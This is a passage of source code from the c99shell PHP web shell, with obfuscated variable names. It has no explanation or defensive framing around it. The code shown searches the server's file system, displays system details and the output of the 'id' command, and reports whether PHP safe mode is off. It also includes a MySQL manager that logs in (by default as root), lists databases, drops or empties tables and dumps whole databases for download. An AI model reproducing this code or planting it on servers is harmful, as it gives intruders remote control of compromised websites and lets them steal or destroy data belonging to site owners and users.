(strtoupper($spe2ff4f) == 'LIMIT') { $spea30d5['limit'] = $sp662a5a[$sp71a197 + 1]; $spea30d5['limit'] = explode(',', $spea30d5['limit']); if (count($spea30d5['limit']) == 1) { $spea30d5['limit'] = array(0, $spea30d5['limit'][0]); } unset($sp662a5a[$sp71a197], $sp662a5a[$sp71a197 + 1]); } } } } else { return false; } } } if (!function_exists('c99fsearch')) { function c99fsearch($sp6bf0a4) { global $sp16bd78; global $spa5c046; global $sp9696a6; global $spe0d033; global $sp420ea0; global $sp5955cc; if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } $sp4431a3 = opendir($sp6bf0a4); while (($sp224638 = readdir($sp4431a3)) !== false) { if ($sp224638 != '.' && $sp224638 != '..') { $sp4aa93d = (empty($sp5955cc['name_regexp']) and strpos($sp224638, $sp5955cc['name']) !== false) || ($sp5955cc['name_regexp'] and preg_match($sp5955cc['name'], $sp224638)); if (is_dir($sp6bf0a4 . $sp224638)) { $sp420ea0++; if (empty($sp5955cc['text']) and $sp4aa93d) { $sp16bd78[] = $sp6bf0a4 . $sp224638; $spa5c046++; } if (!is_link($sp6bf0a4 . $sp224638)) { c99fsearch($sp6bf0a4 . $sp224638); } } else { $spe0d033++; if ($sp4aa93d) { if (!empty($sp5955cc['text'])) { $spd6dd63 = @file_get_contents($sp6bf0a4 . $sp224638); if ($sp5955cc['text_wwo']) { $sp5955cc['text'] = ' ' . trim($sp5955cc['text']) . ' '; } if (!$sp5955cc['text_cs']) { $sp5955cc['text'] = strtolower($sp5955cc['text']); $spd6dd63 = strtolower($spd6dd63); } if ($sp5955cc['text_regexp']) { $sp4aa93d = preg_match($sp5955cc['text'], $spd6dd63); } else { $sp4aa93d = strpos(' ' . $spd6dd63, $sp5955cc['text'], 1); } if ($sp5955cc['text_not']) { $sp4aa93d = !$sp4aa93d; } if ($sp4aa93d) { $sp16bd78[] = $sp6bf0a4 . $sp224638; $sp9696a6++; } } else { $sp16bd78[] = $sp6bf0a4 . $sp224638; $sp9696a6++; } } } } } closedir($sp4431a3); } } if ($spe3b8cc == 'gofile') { if (is_dir($sp224638)) { $spe3b8cc = 'ls'; $sp6bf0a4 = $sp224638; } else { $spe3b8cc = 'f'; $sp6bf0a4 = dirname($sp224638); $sp224638 = basename($sp224638); } } @ob_start(); @ob_implicit_flush(0); function onphpshutdown() { global $spd2385e, $spd19b50; if (!headers_sent() and $spd2385e and !in_array($spd19b50, array('img', 'download', 'notepad'))) { $spe2ff4f = @ob_get_contents(); @ob_end_clean(); @ob_start('ob_gzHandler'); echo $spe2ff4f; @ob_end_flush(); } } function c99shexit() { onphpshutdown(); die; } header('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT'); header('Cache-Control: no-store, no-cache, must-revalidate'); header('Cache-Control: post-check=0, pre-check=0', false); header('Pragma: no-cache'); if (empty($spbb76b1)) { $spbb76b1 = ini_get('upload_tmp_dir'); if (is_dir($spbb76b1)) { $spbb76b1 = '/tmp/'; } } $spbb76b1 = realpath($spbb76b1); $spbb76b1 = str_replace('\\', DIRECTORY_SEPARATOR, $spbb76b1); if (substr($spbb76b1, -1) != DIRECTORY_SEPARATOR) { $spbb76b1 .= DIRECTORY_SEPARATOR; } if (empty($spa74a34)) { $spa74a34 = $spbb76b1; } else { $spa74a34 = realpath($spa74a34); } if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $sp867936 = true; $sp7bd164 = '<font color=red>ON (secure)</font>'; } else { $sp867936 = false; $sp7bd164 = '<font color=green>OFF (not secure)</font>'; } $spe2ff4f = @ini_get('open_basedir'); if ($spe2ff4f or strtolower($spe2ff4f) == 'on') { $sp9461a8 = true; $spce4cbf = '<font color=red>' . $spe2ff4f . '</font>'; } else { $sp9461a8 = false; $spce4cbf = '<font color=green>OFF (not secure)</font>'; } $sp946414 = htmlspecialchars($sp946414); if (empty($sp946414)) { $sp946414 = $sp952cfb; } $sp946414[1] = strtolower($sp946414[1]); $spf50363 = getenv('SERVER_SOFTWARE'); if (!preg_match('PHP/' . phpversion(), $spf50363)) { $spf50363 .= '. PHP/' . phpversion(); } $spf50363 = str_replace('PHP/' . phpversion(), '<a href="' . $sp8c8b96 . 'act=phpinfo" target="_blank"><b><u>PHP/' . phpversion() . '</u></b></a>', htmlspecialchars($spf50363)); @ini_set('highlight.bg', $spc02858); @ini_set('highlight.comment', $sp8a72d5); @ini_set('highlight.default', $sp3775ba); @ini_set('highlight.html', $sp6a5c24); @ini_set('highlight.keyword', $spd04372); @ini_set('highlight.string', $sp3cb2d1); if (!is_array($sp2e8d1b)) { $sp2e8d1b = array(); } $sp68666d = $spe3b8cc = htmlspecialchars($spe3b8cc); $sp71526b = $sp6a4aa1 = $sp5f2c2e = null; $spb26308 = urlencode($sp6bf0a4); ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php  echo getenv('HTTP_HOST'); ?>
 - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php  echo $sp8c8b96; ?>
"><font face="Verdana" size="5"><b>C99Shell v. <?php  echo $sp272375; ?>
</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php  echo $spf50363; ?>
</b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php  echo wordwrap(php_uname(), 90, '<br>', 1); ?>
</b>&nbsp;</p><p align="left"><b><?php  if (!$sp01e9c0) { echo wordwrap(myshellexec('id'), 90, '<br>', 1); } else { echo get_current_user(); } ?>
</b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php  echo $sp7bd164; ?>
</b></p><p align="left"><?php  $sp6bf0a4 = str_replace('\\', DIRECTORY_SEPARATOR, $sp6bf0a4); if (empty($sp6bf0a4)) { $sp6bf0a4 = realpath('.'); } elseif (realpath($sp6bf0a4)) { $sp6bf0a4 = realpath($sp6bf0a4); } $sp6bf0a4 = str_replace('\\', DIRECTORY_SEPARATOR, $sp6bf0a4); if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } $sp6bf0a4 = str_replace('\\\\', '\\', $sp6bf0a4); $sp67e5dd = htmlspecialchars($sp6bf0a4); $sp6598d2 = $sp72c7d5 = explode(DIRECTORY_SEPARATOR, substr($sp6bf0a4, 0, -1)); $sp6c3e91 = 0; foreach ($sp6598d2 as $sp873f91) { $spbcfcd6 = ''; $spc9281a = 0; foreach ($sp72c7d5 as $spd6dd63) { $spbcfcd6 .= $spd6dd63 . DIRECTORY_SEPARATOR; if ($spc9281a == $sp6c3e91) { break; } $spc9281a++; } echo '<a href="' . $sp8c8b96 . 'act=ls&d=' . urlencode($spbcfcd6) . '&sort=' . $sp946414 . '"><b>' . htmlspecialchars($sp873f91) . DIRECTORY_SEPARATOR . '</b></a>'; $sp6c3e91++; } echo '&nbsp;&nbsp;&nbsp;'; if (is_writable($sp6bf0a4)) { $sp036861 = true; $sp6a8a02 = '<font color=green>[ ok ]</font>'; echo '<b><font color=green>' . view_perms(fileperms($sp6bf0a4)) . '</font></b>'; } else { $sp036861 = false; $sp6a8a02 = '<font color=red>[ Read-Only ]</font>'; echo '<b>' . view_perms_color($sp6bf0a4) . '</b>'; } if (is_callable('disk_free_space')) { $sp7997f0 = disk_free_space($sp6bf0a4); $sp8a3200 = disk_total_space($sp6bf0a4); if ($sp7997f0 === false) { $sp7997f0 = 0; } if ($sp8a3200 === false) { $sp8a3200 = 0; } if ($sp7997f0 < 0) { $sp7997f0 = 0; } if ($sp8a3200 < 0) { $sp8a3200 = 0; } $sp2f5415 = $sp8a3200 - $sp7997f0; $sp45051e = round(100 / ($sp8a3200 / $sp7997f0), 2); echo '<br><b>Free ' . view_size($sp7997f0) . ' of ' . view_size($sp8a3200) . ' (' . $sp45051e . '%)</b>'; } echo '<br>'; $spf98db4 = ''; if ($sp01e9c0) { $spe2ff4f = explode('\\', $sp6bf0a4); $spe2ff4f = $spe2ff4f[0]; foreach (range('a', 'z') as $sp6ce706) { $sp4aa93d = $sp894cc9 = in_array($sp6ce706, $speedd37); if (!$sp4aa93d) { $sp4aa93d = is_dir($sp6ce706 . ':\\'); } if ($sp4aa93d) { $spf98db4 .= '<a href="' . $sp8c8b96 . 'act=ls&d=' . urlencode($sp6ce706 . ':\\') . '"' . ($sp894cc9 ? ' onclick="return confirm(\'Make sure that the diskette is inserted properly, otherwise an error may occur.\')"' : '') . '>[ '; if ($sp6ce706 . ':' != $spe2ff4f) { $spf98db4 .= $sp6ce706; } else { $spf98db4 .= '<font color=green>' . $sp6ce706 . '</font>'; } $spf98db4 .= ' ]</a> '; } } if (!empty($spf98db4)) { echo '<b>Detected drives</b>: ' . $spf98db4 . '<br>'; } } if (count($sp1651c7) > 0) { foreach ($sp1651c7 as $sp63375d) { $sp63375d[1] = str_replace('%d', urlencode($sp6bf0a4), $sp63375d[1]); $sp63375d[1] = str_replace('%sort', $sp946414, $sp63375d[1]); $spe2ff4f = realpath($sp6bf0a4 . '..'); if (empty($spe2ff4f)) { $sp5955cc = explode(DIRECTORY_SEPARATOR, $sp6bf0a4); unset($sp5955cc[count($sp5955cc) - 2]); $spe2ff4f = join(DIRECTORY_SEPARATOR, $sp5955cc); } $sp63375d[1] = str_replace('%upd', urlencode($spe2ff4f), $sp63375d[1]); echo '<a href="' . $sp63375d[1] . '">' . $sp63375d[0] . '</a>&nbsp;&nbsp;&nbsp;&nbsp;'; } } echo '</p></td></tr></table><br>'; if (!empty($spcd837d) and in_array($spe3b8cc, $sp09ad6d)) { echo '<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top">' . $spcd837d . '</td></tr></table><br>'; } echo '<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top">'; if ($spe3b8cc == '') { $spe3b8cc = $sp68666d = 'ls'; } if ($spe3b8cc == 'sql') { $spdc3312 = $sp8c8b96 . 'act=sql'; if ($sp84bb41) { $spdc3312 .= '&sql_login=' . htmlspecialchars($sp84bb41); } if ($spca7496) { $spdc3312 .= '&sql_passwd=' . htmlspecialchars($spca7496); } if ($sp77adaf) { $spdc3312 .= '&sql_server=' . htmlspecialchars($sp77adaf); } if ($sp0fd67d) { $spdc3312 .= '&sql_port=' . htmlspecialchars($sp0fd67d); } if ($sp77a7b8) { $spdc3312 .= '&sql_db=' . htmlspecialchars($sp77a7b8); } $spdc3312 .= '&'; ?>
<h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php  if ($sp77adaf) { $sp87d39d = mysql_connect($sp77adaf . ':' . $sp0fd67d, $sp84bb41, $spca7496); $sp90814c = mysql_smarterror(); @mysql_select_db($sp77a7b8, $sp87d39d); if ($sp6f7371 and $spff71ed) { $sp2c2b28 = mysql_query($sp6f7371, $sp87d39d); $sped0b21 = mysql_smarterror(); } } else { $sp87d39d = false; } echo '<b>SQL Manager:</b><br>'; if (!$sp87d39d) { if (!$sp77adaf) { echo 'NO CONNECTION'; } else { echo '<center><b>Can\'t connect</b></center>'; echo '<b>' . $sp90814c . '</b>'; } } else { $spd5ccaa = array(); $spd5ccaa[] = array('Index', $sp8c8b96 . 'act=sql&sql_login=' . htmlspecialchars($sp84bb41) . '&sql_passwd=' . htmlspecialchars($spca7496) . '&sql_server=' . htmlspecialchars($sp77adaf) . '&sql_port=' . htmlspecialchars($sp0fd67d) . '&'); $spd5ccaa[] = array('Query', $spdc3312 . 'sql_act=query&sql_tbl=' . urlencode($spb19fa4)); $spd5ccaa[] = array('Server-status', $sp8c8b96 . 'act=sql&sql_login=' . htmlspecialchars($sp84bb41) . '&sql_passwd=' . htmlspecialchars($spca7496) . '&sql_server=' . htmlspecialchars($sp77adaf) . '&sql_port=' . htmlspecialchars($sp0fd67d) . '&sql_act=serverstatus'); $spd5ccaa[] = array('Server variables', $sp8c8b96 . 'act=sql&sql_login=' . htmlspecialchars($sp84bb41) . '&sql_passwd=' . htmlspecialchars($spca7496) . '&sql_server=' . htmlspecialchars($sp77adaf) . '&sql_port=' . htmlspecialchars($sp0fd67d) . '&sql_act=servervars'); $spd5ccaa[] = array('Processes', $sp8c8b96 . 'act=sql&sql_login=' . htmlspecialchars($sp84bb41) . '&sql_passwd=' . htmlspecialchars($spca7496) . '&sql_server=' . htmlspecialchars($sp77adaf) . '&sql_port=' . htmlspecialchars($sp0fd67d) . '&sql_act=processes'); $spd5ccaa[] = array('Logout', $sp8c8b96 . 'act=sql'); echo '<center><b>MySQL ' . mysql_get_server_info() . ' (proto v.' . mysql_get_proto_info() . ') running in ' . htmlspecialchars($sp77adaf) . ':' . htmlspecialchars($sp0fd67d) . ' as ' . htmlspecialchars($sp84bb41) . '@' . htmlspecialchars($sp77adaf) . ' (password - "' . htmlspecialchars($spca7496) . '")</b><br>'; if (count($spd5ccaa) > 0) { foreach ($spd5ccaa as $sp63375d) { echo '[ <a href="' . $sp63375d[1] . '"><b>' . $sp63375d[0] . '</b></a> ] '; } } echo '</center>'; } echo '</td></tr><tr>'; if (!$sp87d39d) { ?>
<td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php  echo $sp8c8b96; ?>
" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php  } else { if (!empty($sp77a7b8)) { ?>
<td width="25%" height="100%" valign="top"><a href="<?php  echo $sp8c8b96 . 'act=sql&sql_login=' . htmlspecialchars($sp84bb41) . '&sql_passwd=' . htmlspecialchars($spca7496) . '&sql_server=' . htmlspecialchars($sp77adaf) . '&sql_port=' . htmlspecialchars($sp0fd67d) . '&'; ?>
"><b>Home</b></a><hr size="1" noshade><?php  $spea30d5 = mysql_list_tables($sp77a7b8); if (!$spea30d5) { echo mysql_smarterror(); } else { echo '---[ <a href="' . $spdc3312 . '&"><b>' . htmlspecialchars($sp77a7b8) . '</b></a> ]---<br>'; $sp76d016 = 0; while ($spa53ce4 = mysql_fetch_array($spea30d5)) { $sp1eb57e = mysql_query('SELECT COUNT(*) FROM ' . $spa53ce4[0]); $spfc9513 = mysql_fetch_array($sp1eb57e); echo '<b>Â»&nbsp;<a href="' . $spdc3312 . 'sql_db=' . htmlspecialchars($sp77a7b8) . '&sql_tbl=' . htmlspecialchars($spa53ce4[0]) . '"><b>' . htmlspecialchars($spa53ce4[0]) . '</b></a> (' . $spfc9513[0] . ')</br></b>'; mysql_free_result($sp1eb57e); $sp76d016++; } if (!$sp76d016) { echo 'No tables found in database.'; } } } else { ?>
<td width="1" height="100" valign="top"><a href="<?php  echo $spdc3312; ?>
"><b>Home</b></a><hr size="1" noshade><?php  $spea30d5 = mysql_list_dbs($sp87d39d); if (!$spea30d5) { echo mysql_smarterror(); } else { ?>
<form action="<?php  echo $sp8c8b96; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($sp84bb41); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($spca7496); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp77adaf); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp0fd67d); ?>
"><select name="sql_db"><?php  $sp76d016 = 0; $sp7d367d = ''; while ($spa53ce4 = mysql_fetch_row($spea30d5)) { $sp7d367d .= '<option value="' . $spa53ce4[0] . '"'; if ($sp77a7b8 == $spa53ce4[0]) { $sp7d367d .= ' selected'; } $sp7d367d .= '>' . $spa53ce4[0] . '</option>'; $sp76d016++; } echo '<option value="">Databases (' . $sp76d016 . ')</option>'; echo $sp7d367d; } ?>
</select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php  } echo '</td><td width="100%" height="1" valign="top">'; $sp523568 = true; if ($sp77a7b8) { if (!is_numeric($sp76d016)) { $sp76d016 = 0; } if ($sp76d016 == 0) { $sp76d016 = 'no'; } echo '<hr size="1" noshade><center><b>There are ' . $sp76d016 . ' table(s) in this DB (' . htmlspecialchars($sp77a7b8) . ').<br>'; if (count($sp292299) > 0) { foreach ($spc06c7a as $sp63375d) { echo '[ <a href="' . $sp63375d[1] . '">' . $sp63375d[0] . '</a> ] '; } } echo '</b></center>'; $spbebb5b = array('', 'dump'); if ($spe49285 == 'tbldrop') { $sp6f7371 = 'DROP TABLE'; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= '
`' . $spe2ff4f . '` ,'; } $sp6f7371 = substr($sp6f7371, 0, -1) . ';'; $spe49285 = 'query'; } elseif ($spe49285 == 'tblempty') { $sp6f7371 = ''; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= 'DELETE FROM `' . $spe2ff4f . '` 
'; } $spe49285 = 'query'; } elseif ($spe49285 == 'tbldump') { if (count($sp49710e) > 0) { $sp238a10 = $sp49710e; } elseif ($sp007fc1) { $sp238a10 = array($spb19fa4); } $spe49285 = 'dump'; } elseif ($spe49285 == 'tblcheck') { $sp6f7371 = 'CHECK TABLE'; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= '
`' . $spe2ff4f . '` ,'; } $sp6f7371 = substr($sp6f7371, 0, -1) . ';'; $spe49285 = 'query'; } elseif ($spe49285 == 'tbloptimize') { $sp6f7371 = 'OPTIMIZE TABLE'; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= '
`' . $spe2ff4f . '` ,'; } $sp6f7371 = substr($sp6f7371, 0, -1) . ';'; $spe49285 = 'query'; } elseif ($spe49285 == 'tblrepair') { $sp6f7371 = 'REPAIR TABLE'; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= '
`' . $spe2ff4f . '` ,'; } $sp6f7371 = substr($sp6f7371, 0, -1) . ';'; $spe49285 = 'query'; } elseif ($spe49285 == 'tblanalyze') { $sp6f7371 = 'ANALYZE TABLE'; foreach ($sp49710e as $spe2ff4f) { $sp6f7371 .= '
`' . $spe2ff4f . '` ,'; } $sp6f7371 = substr($sp6f7371, 0, -1) . ';'; $spe49285 = 'query'; } elseif ($spe49285 == 'deleterow') { $sp6f7371 = ''; if (!empty($sp764266)) { $sp6f7371 = 'DELETE * FROM `' . $spb19fa4 . '`;'; } else { foreach ($spcbe8e8 as $spe2ff4f) { $sp6f7371 .= 'DELETE * FROM `' . $spb19fa4 . '` WHERE' . $spe2ff4f . ' LIMIT 1;
'; } $sp6f7371 = substr($sp6f7371, 0, -1); } $spe49285 = 'query'; } elseif ($spfbf420 == 'insert') { if ($sp3becd7 == 1) { $spa22ace = ''; $spc6549d = array_keys($spb624a6); foreach ($spc6549d as $spe2ff4f) { $spa22ace .= '`' . addslashes($spe2ff4f) . '`, '; } if (!empty($spa22ace)) { $spa22ace = substr($spa22ace, 0, strlen($spa22ace) - 2); } $spe99d03 = ''; $sp6c3e91 = 0; foreach (array_values($spb624a6) as $spe2ff4f) { if ($sp324df7 = $sp2c7f68[$spc6549d[$sp6c3e91]]) { $spe99d03 .= $sp324df7 . ' ('; } $spe99d03 .= '\'' . addslashes($spe2ff4f) . '\''; if ($sp324df7) { $spe99d03 .= ')'; } $spe99d03 .= ', '; $sp6c3e91++; } if (!empty($spe99d03)) { $spe99d03 = substr($spe99d03, 0, strlen($spe99d03) - 2); } $sp6f7371 = 'INSERT INTO `' . $spb19fa4 . '` ( ' . $spa22ace . ' ) VALUES ( ' . $spe99d03 . ' );'; $spe49285 = 'query'; $spfbf420 = 'browse'; } elseif ($sp3becd7 == 2) { $sp9faf1f = mysql_buildwhere($spb624a6, ', ', $sp2c7f68); $sp6f7371 = 'UPDATE `' . $spb19fa4 . '` SET ' . $sp9faf1f . ' WHERE ' . $spc414ac . ' LIMIT 1;'; $spea30d5 = mysql_query($sp6f7371) or print mysql_smarterror(); $spea30d5 = mysql_fetch_array($spea30d5, MYSQL_ASSOC); $spe49285 = 'query'; $spfbf420 = 'browse'; } } if ($spe49285 == 'query') { echo '<hr size="1" noshade>'; if ($spff71ed and !$sp2c2b28 and $sp3bfc64) { if (!$sped0b21) { $sped0b21 = 'Query was empty'; } echo '<b>Error:</b> <br>' . $sped0b21 . '<br>'; } if ($sp2c2b28 or !$sp3bfc64) { $spe49285 = $sp38ecac; } if (!$spff71ed or $spe49285) { echo '<table border="0" width="100%" height="1"><tr><td><form action="' . $spdc3312 . '" method="POST"><b>'; if ($sp6f7371 and !$spff71ed) { echo 'Do you really want to:'; } else { echo 'SQL-Query :'; } echo '</b><br><br><textarea name="sql_query" cols="100" rows="10">' . htmlspecialchars($sp6f7371) . '</textarea><br><br><input type="hidden" name="sql_act" value="query"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($spb19fa4) . '"><input type="hidden" name="submit" value="1"><input type="hidden" name="sql_goto" value="' . htmlspecialchars($sp38ecac) . '"><input type="submit" name="sql_confirm" value="Yes">&nbsp;<input type="submit" value="No"></form></td></tr></table>'; } } if (in_array($spe49285, $spbebb5b)) { ?>
<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php  echo $sp8c8b96; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php  echo htmlspecialchars($sp77a7b8); ?>
"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($sp84bb41); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($spca7496); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp77adaf); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp0fd67d); ?>
"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php  echo $sp8c8b96; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php  echo htmlspecialchars($sp77a7b8); ?>
"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($sp84bb41); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($spca7496); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp77adaf); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp0fd67d); ?>
"><input type="text" name="dump_file" size="30" value="<?php  echo 'dump_' . getenv('SERVER_NAME') . '_' . $sp77a7b8 . '_' . date('d-m-Y-H-i-s') . '.sql'; ?>
">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php  if (!empty($spe49285)) { echo '<hr size="1" noshade>'; } if ($spe49285 == 'newtbl') { echo '<b>'; if (mysql_create_db($sp29db6c) and !empty($sp29db6c)) { echo 'DB "' . htmlspecialchars($sp29db6c) . '" has been created with success!</b><br>'; } else { echo 'Can\'t create DB "' . htmlspecialchars($sp29db6c) . '".<br>Reason:</b> ' . mysql_smarterror(); } } elseif ($spe49285 == 'dump') { if (empty($spff71ed)) { $sp523568 = false; echo '<form method="GET"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="' . htmlspecialchars($sp77a7b8) . '"><input type="hidden" name="sql_login" value="' . htmlspecialchars($sp84bb41) . '"><input type="hidden" name="sql_passwd" value="' . htmlspecialchars($spca7496) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sp77adaf) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sp0fd67d) . '"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($spb19fa4) . '"><b>SQL-Dump:</b><br><br>'; echo '<b>DB:</b>&nbsp;<input type="text" name="sql_db" value="' . urlencode($sp77a7b8) . '"><br><br>'; $spe2ff4f = join(';', $sp238a10); echo '<b>Only tables (explode ";")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type="text" name="dmptbls" value="' . htmlspecialchars($spe2ff4f) . '" size="' . (strlen($spe2ff4f) + 5) . '"><br><br>'; if ($sp8bf1f6) { $sped1c3a = $sp8bf1f6; } else { $sped1c3a = htmlspecialchars('./dump_' . getenv('SERVER_NAME') . '_' . $sp77a7b8 . '_' . date('d-m-Y-H-i-s') . '.sql'); } echo '<b>File:</b>&nbsp;<input type="text" name="sql_dump_file" value="' . $sped1c3a . '" size="' . (strlen($sped1c3a) + strlen($sped1c3a) % 30) . '"><br><br>'; echo '<b>Download: </b>&nbsp;<input type="checkbox" name="sql_dump_download" value="1" checked><br><br>'; echo '<b>Save to file: </b>&nbsp;<input type="checkbox" name="sql_dump_savetofile" value="1" checked>'; echo '<br><br><input type="submit" name="submit" value="Dump"><br><br><b><sup>1</sup></b> - all, if empty'; echo '</form>'; } else { $sp523568 = true; $sp9faf1f = array(); $sp9faf1f['sock'] = $sp87d39d; $sp9faf1f['db'] = $sp77a7b8; $spfb616d = 'download'; $sp9faf1f['print'] = 0; $sp9faf1f['nl2br'] = 0; $sp9faf1f[''] = 0; $sp9faf1f['file'] = $sp8bf1f6; $sp9faf1f['add_drop'] = true; $sp9faf1f['onlytabs'] = array(); if (!empty($sp238a10)) { $sp9faf1f['onlytabs'] = explode(';', $sp238a10); } $spe6a02a = mysql_dump($sp9faf1f); if ($spf8f1de) { @ob_clean(); header('Content-type: application/octet-stream'); header('Content-length: ' . strlen($spe6a02a)); header('Content-disposition: attachment; filename="' . basename($sp878aa1) . '";'); echo $spe6a02a; die; } elseif ($spf86a05) { $sp694629 = fopen($sp878aa1, 'w'); if (!$sp694629) { echo '<b>Dump error! 